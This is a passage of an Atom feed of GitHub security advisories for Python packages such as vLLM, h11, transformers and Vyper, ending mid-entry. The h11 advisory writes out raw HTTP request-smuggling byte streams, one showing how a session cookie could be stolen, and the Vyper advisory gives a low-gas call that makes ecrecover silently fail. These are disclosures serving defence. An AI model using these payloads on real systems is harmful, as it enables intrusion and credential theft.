<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2025-05-02T05:01:33.978Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vllm] phi4mm: Quadratic Time Complexity in Input Token Processing​ leads to denial of service]]></title>
        <id>https://github.com/advisories/GHSA-vc6m-hm49-g9qg</id>
        <link href="https://github.com/advisories/GHSA-vc6m-hm49-g9qg"/>
        <updated>2025-04-30T17:27:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A critical performance vulnerability has been identified in the input preprocessing logic of the multimodal tokenizer. The code dynamically replaces placeholder tokens (e.g., &lt;|audio_*|&gt;, &lt;|image_*|&gt;) with repeated tokens based on precomputed lengths. Due to ​​inefficient list concatenation operations​​, the algorithm exhibits ​​quadratic time complexity (O(n²))​​, allowing malicious actors to trigger resource exhaustion via specially crafted inputs.</p>
<h3 id="details">Details</h3>
<p>​​Affected Component​​: input_processor_for_phi4mm function.
<a href="https://github.com/vllm-project/vllm/blob/8cac35ba435906fb7eb07e44fe1a8c26e8744f4e/vllm/model_executor/models/phi4mm.py#L1182-L1197">https://github.com/vllm-project/vllm/blob/8cac35ba435906fb7eb07e44fe1a8c26e8744f4e/vllm/model_executor/models/phi4mm.py#L1182-L1197</a></p>
<p>The code modifies the input_ids list in-place using input_ids = input_ids[:i] + tokens + input_ids[i+1:]. Each concatenation operation copies the entire list, leading to O(n) operations per replacement. For k placeholders expanding to m tokens, total time becomes O(kmn), approximating O(n²) in worst-case scenarios.</p>
<h3 id="poc">PoC</h3>
<p>Test data demonstrates exponential time growth:</p>
<pre><code class="language-python">test_cases = [100, 200, 400, 800, 1600, 3200, 6400]
run_times = [0.002, 0.007, 0.028, 0.136, 0.616, 2.707, 11.854]  # seconds
</code></pre>
<p>Doubling input size increases runtime by ~4x (consistent with O(n²)).</p>
<h3 id="impact">Impact</h3>
<p>​​Denial-of-Service (DoS):​​ An attacker could submit inputs with many placeholders (e.g., 10,000 &lt;|audio_1|&gt; tokens), causing CPU/memory exhaustion.
Example: 10,000 placeholders → ~100 million operations.</p>
<h3 id="remediation-recommendations">Remediation Recommendations​</h3>
<p>Precompute all placeholder positions and expansion lengths upfront.
Replace dynamic list concatenation with a single preallocated array.</p>
<pre><code class="language-python"># Pseudocode for O(n) solution
new_input_ids = []
for token in input_ids:
    if token is placeholder:
        new_input_ids.extend([token] * precomputed_length)
    else:
        new_input_ids.append(token)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-vc6m-hm49-g9qg">https://github.com/vllm-project/vllm/security/advisories/GHSA-vc6m-hm49-g9qg</a></li>
<li><a href="https://github.com/vllm-project/vllm/blob/8cac35ba435906fb7eb07e44fe1a8c26e8744f4e/vllm/model_executor/models/phi4mm.py#L1182-L1197">https://github.com/vllm-project/vllm/blob/8cac35ba435906fb7eb07e44fe1a8c26e8744f4e/vllm/model_executor/models/phi4mm.py#L1182-L1197</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46560">https://nvd.nist.gov/vuln/detail/CVE-2025-46560</a></li>
<li><a href="https://github.com/advisories/GHSA-vc6m-hm49-g9qg">https://github.com/advisories/GHSA-vc6m-hm49-g9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc6m-hm49-g9qg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-29T16:43:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transformers] Transformers Regular Expression Denial of Service (ReDoS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fpwr-67px-3qhx</id>
        <link href="https://github.com/advisories/GHSA-fpwr-67px-3qhx"/>
        <updated>2025-04-29T15:17:04.000Z</updated>
        <content type="html"><![CDATA[<p>A Regular Expression Denial of Service (ReDoS) vulnerability was identified in the huggingface/transformers library, specifically in the file <code>tokenization_gpt_neox_japanese.py</code> of the GPT-NeoX-Japanese model. The vulnerability occurs in the SubWordJapaneseTokenizer class, where regular expressions process specially crafted inputs. The issue stems from a regex exhibiting exponential complexity under certain conditions, leading to excessive backtracking. This can result in high CPU usage and potential application downtime, effectively creating a Denial of Service (DoS) scenario. The affected version is v4.48.1 (latest).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1194">https://nvd.nist.gov/vuln/detail/CVE-2025-1194</a></li>
<li><a href="https://github.com/huggingface/transformers/commit/92c5ca9dd70de3ade2af2eb835c96215cc50e815">https://github.com/huggingface/transformers/commit/92c5ca9dd70de3ade2af2eb835c96215cc50e815</a></li>
<li><a href="https://huntr.com/bounties/86f58dcd-683f-4adc-a735-849f51e9abb2">https://huntr.com/bounties/86f58dcd-683f-4adc-a735-849f51e9abb2</a></li>
<li><a href="https://github.com/advisories/GHSA-fpwr-67px-3qhx">https://github.com/advisories/GHSA-fpwr-67px-3qhx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpwr-67px-3qhx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-29T12:30:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aworld] AWorld OS Command Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jmjf-mfhm-j3gf</id>
        <link href="https://github.com/advisories/GHSA-jmjf-mfhm-j3gf"/>
        <updated>2025-04-29T15:08:11.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in inclusionAI AWorld up to 8c257626e648d98d793dd9a1a950c2af4dd84c4e. It has been rated as critical. This issue affects the function subprocess.run/subprocess.Popen of the file AWorld/aworld/virtual_environments/terminals/shell_tool.py. The manipulation leads to os command injection. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. This product does not use versioning. This is why information about affected and unaffected releases are unavailable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4032">https://nvd.nist.gov/vuln/detail/CVE-2025-4032</a></li>
<li><a href="https://github.com/inclusionAI/AWorld/issues/38">https://github.com/inclusionAI/AWorld/issues/38</a></li>
<li><a href="https://github.com/inclusionAI/AWorld/issues/38#issuecomment-2806190923">https://github.com/inclusionAI/AWorld/issues/38#issuecomment-2806190923</a></li>
<li><a href="https://vuldb.com/?ctiid.306395">https://vuldb.com/?ctiid.306395</a></li>
<li><a href="https://vuldb.com/?id.306395">https://vuldb.com/?id.306395</a></li>
<li><a href="https://vuldb.com/?submit.559222">https://vuldb.com/?submit.559222</a></li>
<li><a href="https://github.com/advisories/GHSA-jmjf-mfhm-j3gf">https://github.com/advisories/GHSA-jmjf-mfhm-j3gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmjf-mfhm-j3gf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-28T21:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM Vulnerable to Remote Code Execution via Mooncake Integration]]></title>
        <id>https://github.com/advisories/GHSA-hj4w-hm2g-p6w5</id>
        <link href="https://github.com/advisories/GHSA-hj4w-hm2g-p6w5"/>
        <updated>2025-04-30T17:27:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impacted-deployments">Impacted Deployments</h2>
<p><strong>Note that vLLM instances that do NOT make use of the mooncake integration are NOT vulnerable.</strong></p>
<h2 id="description">Description</h2>
<p>vLLM integration with mooncake is vaulnerable to remote code execution due to using <code>pickle</code> based serialization over unsecured ZeroMQ sockets. The vulnerable sockets were set to listen on all network interfaces, increasing the likelihood that an attacker is able to reach the vulnerable ZeroMQ sockets to carry out an attack.</p>
<p>This is a similar to <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7">GHSA - x3m8 - f7g5 - qhm7</a>, the problem is in</p>
<p><a href="https://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179">https://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179</a></p>
<p>Here <a href="https://github.com/zeromq/pyzmq/blob/453f00c5645a3bea40d79f53aa8c47d85038dc2d/zmq/sugar/socket.py#L961">recv_pyobj()</a> Contains implicit <code>pickle.loads()</code>, which leads to potential RCE.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hj4w-hm2g-p6w5">https://github.com/vllm-project/vllm/security/advisories/GHSA-hj4w-hm2g-p6w5</a></li>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7">https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/a5450f11c95847cf51a17207af9a3ca5ab569b2c">https://github.com/vllm-project/vllm/commit/a5450f11c95847cf51a17207af9a3ca5ab569b2c</a></li>
<li><a href="https://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179">https://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32444">https://nvd.nist.gov/vuln/detail/CVE-2025-32444</a></li>
<li><a href="https://github.com/advisories/GHSA-hj4w-hm2g-p6w5">https://github.com/advisories/GHSA-hj4w-hm2g-p6w5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj4w-hm2g-p6w5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-29T14:52:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] Data exposure via ZeroMQ on multi-node vLLM deployment]]></title>
        <id>https://github.com/advisories/GHSA-9f8f-2vmf-885j</id>
        <link href="https://github.com/advisories/GHSA-9f8f-2vmf-885j"/>
        <updated>2025-04-30T17:26:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In a multi-node vLLM deployment, vLLM uses ZeroMQ for some multi-node communication purposes. The primary vLLM host opens an <code>XPUB</code> ZeroMQ socket and binds it to ALL interfaces. While the socket is always opened for a multi-node deployment, it is only used when doing tensor parallelism across multiple hosts.</p>
<p>Any client with network access to this host can connect to this <code>XPUB</code> socket unless its port is blocked by a firewall. Once connected, these arbitrary clients will receive all of the same data broadcasted to all of the secondary vLLM hosts. This data is internal vLLM state information that is not useful to an attacker.</p>
<p>By potentially connecting to this socket many times and not reading data published to them, an attacker can also cause a denial of service by slowing down or potentially blocking the publisher.</p>
<h3 id="detailed-analysis">Detailed Analysis</h3>
<p>The <code>XPUB</code> socket in question is created here:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/c21b99b91241409c2fdf9f3f8c542e8748b317be/vllm/distributed/device_communicators/shm_broadcast.py#L236-L237">https://github.com/vllm-project/vllm/blob/c21b99b91241409c2fdf9f3f8c542e8748b317be/vllm/distributed/device_communicators/shm_broadcast.py#L236-L237</a></p>
<p>Data is published over this socket via <code>MessageQueue.enqueue()</code> which is called by <code>MessageQueue.broadcast_object()</code>:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L452-L453">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L452-L453</a></p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L475-L478">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/device_communicators/shm_broadcast.py#L475-L478</a></p>
<p>The <code>MessageQueue.broadcast_object()</code> method is called by the <code>GroupCoordinator.broadcast_object()</code> method in <code>parallel_state.py</code>:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L364-L366">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L364-L366</a></p>
<p>The broadcast over ZeroMQ is only done if the <code>GroupCoordinator</code> was created with <code>use_message_queue_broadcaster</code> set to <code>True</code>:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L216-L219">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L216-L219</a></p>
<p>The only case where <code>GroupCoordinator</code> is created with <code>use_message_queue_broadcaster</code> is the coordinator for the tensor parallelism group:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L931-L936">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L931-L936</a></p>
<p>To determine what data is broadcasted to the tensor parallism group, we must continue tracing. <code>GroupCoordinator.broadcast_object()</code> is called by <code>GroupCoordinator.broadcoast_tensor_dict()</code>:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L489">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/parallel_state.py#L489</a></p>
<p>which is called by <code>broadcast_tensor_dict()</code> in <code>communication_op.py</code>:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/communication_op.py#L29-L34">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/distributed/communication_op.py#L29-L34</a></p>
<p>If we look at <code>_get_driver_input_and_broadcast()</code> in the V0 <code>worker_base.py</code>, we'll see how this tensor dict is formed:</p>
<p><a href="https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/worker/worker_base.py#L332-L352">https://github.com/vllm-project/vllm/blob/790b79750b596043036b9fcbee885827fdd2ef3d/vllm/worker/worker_base.py#L332-L352</a></p>
<p>but the data actually sent over ZeroMQ is the <code>metadata_list</code> portion that is split from this <code>tensor_dict</code>. The tensor parts are sent via <code>torch.distributed</code> and only metadata about those tensors is sent via ZeroMQ.</p>
<p><a href="https://github.com/vllm-project/vllm/blob/54a66e5fee4a1ea62f1e4c79a078b20668e408c6/vllm/distributed/parallel_state.py#L61-L83">https://github.com/vllm-project/vllm/blob/54a66e5fee4a1ea62f1e4c79a078b20668e408c6/vllm/distributed/parallel_state.py#L61-L83</a></p>
<h3 id="patches">Patches</h3>
<p>No fix yet.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Prior to the fix, your options include:</p>
<ol>
<li>Do not expose the vLLM host to a network where any untrusted connections may reach the host.</li>
<li>Ensure that only the other vLLM hosts are able to connect to the TCP port used for the <code>XPUB</code> socket. Note that port used is random.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li>Relevant code first introduced in <a href="https://github.com/vllm-project/vllm/pull/6183">https://github.com/vllm-project/vllm/pull/6183</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-9f8f-2vmf-885j">https://github.com/vllm-project/vllm/security/advisories/GHSA-9f8f-2vmf-885j</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/6183">https://github.com/vllm-project/vllm/pull/6183</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/a0304dc504c85f421d38ef47c64f83046a13641c">https://github.com/vllm-project/vllm/commit/a0304dc504c85f421d38ef47c64f83046a13641c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30202">https://nvd.nist.gov/vuln/detail/CVE-2025-30202</a></li>
<li><a href="https://github.com/advisories/GHSA-9f8f-2vmf-885j">https://github.com/advisories/GHSA-9f8f-2vmf-885j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9f8f-2vmf-885j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-29T14:50:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[markdownify] markdownify allows large headline prefixes such as <h9999999>, which causes memory consumption]]></title>
        <id>https://github.com/advisories/GHSA-7mpr-5m44-h73r</id>
        <link href="https://github.com/advisories/GHSA-7mpr-5m44-h73r"/>
        <updated>2025-04-28T14:34:52.000Z</updated>
        <content type="html"><![CDATA[<p>python-markdownify (aka markdownify) before 0.14.1 allows large headline prefixes such as  in addition to </p><h1> through </h1><h6>. This causes memory consumption.<p></p>
</h6><h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46656">https://nvd.nist.gov/vuln/detail/CVE-2025-46656</a></li>
<li><a href="https://github.com/matthewwithanm/python-markdownify/issues/143">https://github.com/matthewwithanm/python-markdownify/issues/143</a></li>
<li><a href="https://github.com/matthewwithanm/python-markdownify/compare/0.14.0...0.14.1">https://github.com/matthewwithanm/python-markdownify/compare/0.14.0...0.14.1</a></li>
<li><a href="https://github.com/matthewwithanm/python-markdownify/commit/959561879693bf4a576f99c6733b50b01186aa08">https://github.com/matthewwithanm/python-markdownify/commit/959561879693bf4a576f99c6733b50b01186aa08</a></li>
<li><a href="https://github.com/advisories/GHSA-7mpr-5m44-h73r">https://github.com/advisories/GHSA-7mpr-5m44-h73r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7mpr-5m44-h73r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-27T00:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[h11] h11 accepts some malformed Chunked-Encoding bodies]]></title>
        <id>https://github.com/advisories/GHSA-vqfr-h8mv-ghfj</id>
        <link href="https://github.com/advisories/GHSA-vqfr-h8mv-ghfj"/>
        <updated>2025-04-24T21:41:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.</p>
<h3 id="details">Details</h3>
<p>HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of "chunks", each of which consists of:</p>
<ul>
<li>chunk length</li>
<li><code>\r\n</code></li>
<li><code>length</code> bytes of content</li>
<li><code>\r\n</code></li>
</ul>
<p>In versions of h11 up to 0.14.0, h11 instead parsed them as:</p>
<ul>
<li>chunk length</li>
<li><code>\r\n</code></li>
<li><code>length</code> bytes of content</li>
<li>any two bytes</li>
</ul>
<p>i.e. it did not validate that the trailing <code>\r\n</code> bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.</p>
<p>By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a <em>different</em> bug in parsing Chunked-Encoding, acting as if the format is:</p>
<ul>
<li>chunk length</li>
<li><code>\r\n</code></li>
<li><code>length</code> bytes of content</li>
<li>more bytes of content, as many as it takes until you find a <code>\r\n</code></li>
</ul>
<p>For example, <a href="https://github.com/graygnuorg/pound/pull/43">pound</a> had this bug -- it can happen if an implementer uses a generic "read until end of line" helper to consumes the trailing <code>\r\n</code>.</p>
<p>In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are <code>\r\n</code>):</p>
<pre><code>GET /one HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5
AAAAAXX2
45
0

GET /two HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

0
</code></pre>
<p>Here h11 will interpret it as two requests, one with body <code>AAAAA45</code> and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body <code>AAAAXX20\r\n\r\nGET /two ...</code>. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a "request smuggling" attack. For example, if <code>/two</code> is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.</p>
<p>Even worse, if our buggy reverse proxy receives two requests from different users:</p>
<pre><code>GET /one HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5
AAAAAXX999
0
</code></pre>
<pre><code>GET /two HTTP/1.1
Host: localhost
Cookie: SESSION_KEY=abcdef...
</code></pre>
<p>...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as <em>one</em> request to <code>/one</code> whose body includes <code>/two</code>'s session key, potentially allowing one user to steal another's credentials.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in h11 0.15.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.</p>
<h3 id="credits">Credits</h3>
<p>Reported by Jeppe Bonde Weikop on 2025-01-09.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj">https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj</a></li>
<li><a href="https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed">https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43859">https://nvd.nist.gov/vuln/detail/CVE-2025-43859</a></li>
<li><a href="https://github.com/advisories/GHSA-vqfr-h8mv-ghfj">https://github.com/advisories/GHSA-vqfr-h8mv-ghfj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqfr-h8mv-ghfj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-24T16:07:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[picklescan] Duplicate Advisory: Picklescan Vulnerable to Exfiltration via DNS via linecache and ssl.get_server_certificate]]></title>
        <id>https://github.com/advisories/GHSA-4p4h-9gvq-7xfg</id>
        <link href="https://github.com/advisories/GHSA-4p4h-9gvq-7xfg"/>
        <updated>2025-04-24T16:02:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="duplicate-advisory">Duplicate Advisory</h1>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-93mv-x874-956g. This link is maintained to preserve external references.</p>
<h1 id="original-description">Original Description</h1>
<p>The unsafe globals in Picklescan before 0.0.25 do not include ssl. Consequently, ssl.get_server_certificate can exfiltrate data via DNS after deserialization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46417">https://nvd.nist.gov/vuln/detail/CVE-2025-46417</a></li>
<li><a href="https://github.com/mmaitre314/picklescan/pull/40">https://github.com/mmaitre314/picklescan/pull/40</a></li>
<li><a href="https://github.com/advisories/GHSA-93mv-x874-956g">https://github.com/advisories/GHSA-93mv-x874-956g</a></li>
<li><a href="https://github.com/advisories/GHSA-4p4h-9gvq-7xfg">https://github.com/advisories/GHSA-4p4h-9gvq-7xfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4p4h-9gvq-7xfg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-24T03:31:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper Does Not Check the Success of Certain Precompile Calls]]></title>
        <id>https://github.com/advisories/GHSA-vgf2-gvx8-xwc3</id>
        <link href="https://github.com/advisories/GHSA-vgf2-gvx8-xwc3"/>
        <updated>2025-04-24T14:39:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When the Vyper Compiler uses the precompiles EcRecover (0x1) and Identity (0x4), the success flag of the call is not checked. As a consequence an attacker can provide a specific amount of gas to make these calls fail but let the overall execution continue. Then the execution result can be incorrect.</p>
<p>Based on EVM's rules, after the failed precompile the remaining code has only 1/64 of the pre-call-gas left (as 63/64 were forwarded and spent). Hence, only fairly simple executions can follow the failed precompile calls. Therefore, we found no significantly impacted real-world contracts.</p>
<p>The fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4451">https://github.com/vyperlang/vyper/pull/4451</a>.</p>
<h3 id="details">Details</h3>
<h4 id="the-relevant-precompiles">The relevant precompiles</h4>
<h5 id="ecrecover">EcRecover</h5>
<p>EcRecover is used in vyper's <code>ecrecover</code> built-in. As the precompile consumes 3000 gas, any execution after an out-of-gas EcRecover call has at most 47 gas left.</p>
<h5 id="identity">Identity</h5>
<ul>
<li>The Identity precompile is used in vyper to perform memory copy operations. As its cost is variable, a variable amount of gas might be left after a failed call. The bigger the copy operation, the more gas can be left. Hence, a failed call to Identity could theoretically be followed by successful storage changes or emitted events.</li>
<li>Identity is no longer used when <code>evm-version</code> <code>cancun</code> is used (because <code>MCOPY</code> is used instead). In 0.4.0 <code>cancun</code> is default, in 0.3.10 <code>cancun</code> is an option, otherwise <code>cancun</code> is not available. As only pre-<code>cancun</code> versions are relevant, we don't have to consider transient storage operations succeeding a failed call to Identity.</li>
</ul>
<h4 id="the-other-precompiles">The other precompiles</h4>
<ul>
<li>Calls to <code>Sha2</code>, <code>ecAdd</code>, and <code>ecMul</code> have success checks and have had them for a long time.</li>
<li>The precompiles <code>modexp</code>, <code>ripe</code>, <code>blake</code>, <code>ecPairing</code>, and <code>Point Evaluation</code> have no builtins in vyper.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>In the following we provide concrete examples of incorrectly generated bytecode. These examples are not optimized, but rather Proof-of-Concepts. The list is also not exhaustive.</p>
<h4 id="ecrecover-use"><code>ecrecover</code> use</h4>
<ul>
<li>Affected versions: 0.2.0 - 0.4.0 </li>
<li>For older compiler versions (&lt;=0.3.9) it behaves similarly to this <a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-f5x6-7qgp-jhf3">older advisory</a>. As no data is returned, the previous value of the memory word is returned to the user. Hence, any dirty bytes might be returned. Contracts with older compiler versions and <code>ecrecover</code> were checked.</li>
<li>For new vyper versions, the output buffer is zeroed, so when the call fails zero is returned. This is an incorrect result, but developers should anyway check for 0 as a failure case. Hence, this is unlikely to result in issues. However, we did search for such cases.</li>
<li>As mentioned above at most 47 gas is left after the failed call, hence a <code>return</code> is the most realistic scenario to be attacked.</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
@view
def foo(hash: bytes32, v: uint256, r:uint256, s:uint256) -&gt; address:
    return ecrecover(hash, v, r, s)
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">print(
    c.foo(
        binascii.unhexlify(
            "6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055"
        ),
        28,
        78616903610408968922803823221221116251138855211764625814919875002740131251724,
        37668412420813231458864536126575229553064045345107737433087067088194345044408,
    )
)  # Returns 0x9eE53ad38Bb67d745223a4257D7d48cE973FeB7A

print(
    c.foo(
        binascii.unhexlify(
            "6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055"
        ),
        28,
        78616903610408968922803823221221116251138855211764625814919875002740131251724,
        37668412420813231458864536126575229553064045345107737433087067088194345044408,
        gas=3000,
    )
)  # Returns 0x0000000000000000000000000000000000000000
</code></pre>
<h4 id="identity-to-copy-dynamic-arrays">Identity to copy Dynamic Arrays</h4>
<ul>
<li>Affected versions: 0.3.2 - 0.3.9</li>
<li>Dynamic Arrays might be copied on different occasions</li>
<li>That copy operation can fail leading to incorrect accesses afterwards</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">
@external
def foo() -&gt; uint256:
